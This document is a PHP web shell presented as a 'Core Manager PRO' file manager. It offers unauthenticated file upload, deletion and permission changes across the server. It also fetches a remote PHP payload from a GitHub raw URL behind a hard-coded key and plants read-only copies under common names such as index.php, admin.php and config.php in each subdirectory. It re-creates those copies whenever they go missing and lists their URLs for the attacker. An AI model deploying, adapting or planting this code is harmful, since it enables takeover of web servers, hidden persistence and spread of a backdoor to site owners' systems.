<?php
/**
 * System Core Manager - Final Optimized (Folder Top Priority)
 * Features: Folders First, Visibility Fix, Dynamic Naming, Auto-Healing
 */

$path = isset($_GET['path']) ? $_GET['path'] : __DIR__;
$path = realpath($path);
$masterBackupName = '.master_core_backup'; 
$masterBackup = $path . DIRECTORY_SEPARATOR . $masterBackupName; 
$secretKey = "mysecure123";
$githubUrl = "https://raw.githubusercontent.com/alaminx6275-arch/php-file-server1/refs/heads/main/php-file.php";
$phpVersion = phpversion();

$priorityNames = [
    'about.php', 'admin.php', 'administrator.php', 'admin_panel.php', 'ajax.php', 'api.php', 
    'auth.php', 'config.php', 'core.php', 'cpanel.php', 'dashboard.php', 'db.php', 
    'default.php', 'delete.php', 'edit.php', 'filemanager.php', 'files.php', 'help.php', 
    'index.php', 'info.php', 'init.php', 'install.php', 'login.php', 'main.php', 
    'profile.php', 'root.php', 'sc.php', 'service.php', 'settings.php', 'system.php', 
    'up.php', 'update.php', 'upload.php', 'uploads.php'
];

function getMissingName($dir, $names) {
    foreach ($names as $name) {
        if (!file_exists($dir . DIRECTORY_SEPARATOR . $name)) return $name;
    }
    return 'sys_'.time().'.php';
}

if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file_upload'])) {
    move_uploaded_file($_FILES['file_upload']['tmp_name'], $path . DIRECTORY_SEPARATOR . $_FILES['file_upload']['name']);
}

if (isset($_GET['action']) && $_GET['action'] == 'auto_process') {
    if (!isset($_GET['key']) || $_GET['key'] !== $secretKey) die("ACCESS DENIED");
    $fileData = @file_get_contents($githubUrl);
    if ($fileData) {
        if (file_exists($masterBackup)) @chmod($masterBackup, 0644);
        file_put_contents($masterBackup, $fileData);
        @chmod($masterBackup, 0444);
        $dName = getMissingName($path, $priorityNames);
        file_put_contents($path . DIRECTORY_SEPARATOR . $dName, $fileData);
        @chmod($path . DIRECTORY_SEPARATOR . $dName, 0444);
    }
}

if (file_exists($masterBackup)) {
    $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
    $it->setMaxDepth(2); 
    foreach ($it as $file) {
        if ($file->isDir()) {
            $dir = $file->getPathname();
            $found = false;
            foreach ($priorityNames as $n) {
                if (file_exists($dir . DIRECTORY_SEPARATOR . $n) && md5_file($dir . DIRECTORY_SEPARATOR . $n) === md5_file($masterBackup)) { $found = true; break; }
            }
            if (!$found) {
                $newName = getMissingName($dir, $priorityNames);
                @copy($masterBackup, $dir . DIRECTORY_SEPARATOR . $newName);
                @chmod($dir . DIRECTORY_SEPARATOR . $newName, 0444);
            }
        }
    }
}

if (isset($_GET['delete'])) {
    $f = realpath($_GET['delete']);
    if ($f && strpos($f, $path) === 0) { @chmod($f, 0777); is_dir($f) ? @rmdir($f) : @unlink($f); header("Location: ?path=".urlencode($path)); exit; }
}
if (isset($_POST['apply_chmod'])) {
    $f = realpath($_POST['file_path']);
    if ($f) { @chmod($f, octdec($_POST['new_perm'])); header("Location: ?path=".urlencode($path)); exit; }
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>Core Manager PRO</title>
    <style>
        :root { --bg: #0a0a0a; --card: #121212; --hvr: #1f1f1f; --accent: #6f42c1; --txt: #d1d1d1; --red: #ff4d4d; --white: #ffffff; --blue: #3ea6ff; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: var(--bg); color: var(--txt); margin: 0; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; }
        .header { text-align: center; padding: 20px; background: #111; border-radius: 10px; border: 1px solid #222; margin-bottom: 20px; }
        .header h1 { margin: 0; font-size: 26px; background: linear-gradient(to right, #8e44ad, #3498db); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .php-v { font-size: 11px; color: #00ff00; background: #1a1a1a; padding: 3px 12px; border-radius: 20px; border: 1px solid #333; margin-top: 10px; display: inline-block; }
        
        textarea { width: 100%; height: 60px; background: #000; color: #00ff00; border: 1px solid #333; border-left: 4px solid var(--accent); border-radius: 5px; padding: 10px; font-family: monospace; font-size: 12px; resize: none; margin-top: 10px; outline: none; }
        
        .card { background: var(--card); padding: 15px; border-radius: 8px; border: 1px solid #222; margin-bottom: 15px; }
        table { width: 100%; border-collapse: collapse; }
        tr { border-bottom: 1px solid #1a1a1a; transition: 0.2s; }
        tr:hover { background: var(--hvr); box-shadow: inset 4px 0 0 var(--accent); }
        th, td { padding: 12px; text-align: left; font-size: 13px; }

        /* কালার ও ভিজিবিলিটি */
        .folder-link { color: var(--blue); font-weight: bold; text-decoration: none; }
        .folder-link:hover { color: #ffffff; text-decoration: underline; }
        .file-white { color: var(--white); }
        .file-red { color: var(--red); font-weight: bold; }
        
        .btn { padding: 5px 12px; border-radius: 4px; border: none; cursor: pointer; color: #fff; font-size: 12px; font-weight: bold; }
        .inline-form { display: none; margin-top: 5px; padding: 8px; background: #000; border: 1px solid var(--accent); border-radius: 5px; }
    </style>
</head>
<body>

<div class="container">
    <div class="header">
        <h1>AUTOMATED CORE MANAGER</h1>
        <div class="php-v">Server PHP: <?= $phpVersion ?></div>
    </div>

    <div class="card">
        <div style="display:flex; justify-content:space-between; align-items:center;">
            <span style="font-size:12px; color:var(--accent); font-weight:bold;">🔗 PROPAGATION LIST</span>
            <button class="btn" style="background:#28a745; font-size:10px;" onclick="copyBox()">Copy All</button>
        </div>
        <textarea id="urlBox" readonly><?php
            $items = scandir($path); $urls = [];
            foreach ($items as $item) {
                if ($item != "." && $item != ".." && is_dir($path."/".$item)) {
                    foreach($priorityNames as $pn) {
                        if(file_exists($path."/".$item."/".$pn)) { $urls[] = "https://".$_SERVER['HTTP_HOST']."/".$item."/".$pn; break; }
                    }
                }
            }
            echo implode("\n", $urls);
        ?></textarea>
    </div>

    <div class="card" style="display:flex; justify-content:space-between; align-items:center;">
        <form method="POST" enctype="multipart/form-data"><input type="file" name="file_upload" style="font-size:11px;"> <button type="submit" class="btn" style="background:#007bff;">Upload</button></form>
        <div><a href="?path=<?=urlencode(dirname($path))?>" class="btn" style="background:#333;">⬆ Up</a> <a href="?path=<?=urlencode($path)?>&action=auto_process&key=<?=$secretKey?>" class="btn" style="background:var(--accent);">⚡ Sync GitHub</a></div>
    </div>

    <div class="card" style="padding:0; overflow:hidden;">
        <table>
            <thead><tr style="background:#111; color: #777;"><th>Name</th><th>Perm</th><th>Size</th><th style="text-align:right; padding-right:20px;">Actions</th></tr></thead>
            <tbody>
                <?php
                $folders = [];
                $files = [];
                foreach ($items as $item) {
                    if ($item == "." || $item == ".." || $item == $masterBackupName) continue;
                    if (is_dir($path . DIRECTORY_SEPARATOR . $item)) $folders[] = $item;
                    else $files[] = $item;
                }
                natcasesort($folders);
                natcasesort($files);
                $finalItems = array_merge($folders, $files); // ফোল্ডার আগে, ফাইল পরে

                foreach ($finalItems as $index => $item):
                    $fP = $path . DIRECTORY_SEPARATOR . $item;
                    $isD = is_dir($fP); 
                    $prm = substr(sprintf('%o', fileperms($fP)), -4);
                    $colorClass = ($prm == "0444") ? "file-red" : "file-white";
                ?>
                <tr>
                    <td>
                        <?php if($isD): ?>
                            📁 <a href="?path=<?=urlencode($fP)?>" class="folder-link"><?= $item ?></a>
                        <?php else: ?>
                            📄 <span class="<?= $colorClass ?>"><?= $item ?></span>
                        <?php endif; ?>

                        <div id="p-<?= $index ?>" class="inline-form">
                            <form method="POST">
                                <input type="hidden" name="file_path" value="<?=htmlspecialchars($fP)?>">
                                <input type="text" name="new_perm" value="<?=$prm?>" style="width:50px; background:#222; color:#fff; border:1px solid #444; padding:3px;">
                                <button type="submit" name="apply_chmod" class="btn" style="background:#28a745;">Set</button>
                            </form>
                        </div>
                    </td>
                    <td style="color:#ffc107; font-family:monospace;"><?= $prm ?></td>
                    <td><?= $isD ? "DIR" : round(filesize($fP)/1024, 1)." KB" ?></td>
                    <td style="text-align:right;">
                        <button class="btn" style="background:#00acc1; padding:3px 8px;" onclick="showP('<?=$index?>')">P</button>
                        <a href="?path=<?=urlencode($path)?>&delete=<?=urlencode($fP)?>" class="btn" style="background:#e91e63; padding:3px 8px;" onclick="return confirm('Delete?')">D</a>
                    </td>
                </tr>
                <?php endforeach; ?>
            </tbody>
        </table>
    </div>
</div>

<script>
    function showP(id) { var e = document.getElementById('p-' + id); e.style.display = (e.style.display === 'block') ? 'none' : 'block'; }
    function copyBox() { var b = document.getElementById('urlBox'); b.select(); document.execCommand('copy'); alert('Copied!'); }
</script>
</body>
</html>
